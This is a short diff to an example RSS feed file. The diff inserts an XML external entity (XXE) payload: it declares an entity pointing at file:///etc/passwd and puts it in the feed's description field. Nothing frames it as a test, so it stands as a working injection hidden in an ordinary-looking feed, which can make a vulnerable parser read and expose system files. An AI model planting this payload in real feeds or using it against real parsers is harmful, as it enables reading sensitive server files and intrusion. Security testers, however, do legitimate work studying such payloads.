@@ -1,9 +1,12 @@
 <?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <rss version="2.0">
   <channel>
     <title>Example RSS Feed</title>
     <link>https://www.example.com</link>
-    <description>This is an example RSS feed</description>
+    <description><foo>&xxe;</foo></description>
     <language>en-us</language>
     <pubDate>Fri, 06 Sep 2024 09:00:00 +0000</pubDate>
     <lastBuildDate>Fri, 06 Sep 2024 09:00:00 +0000</lastBuildDate>
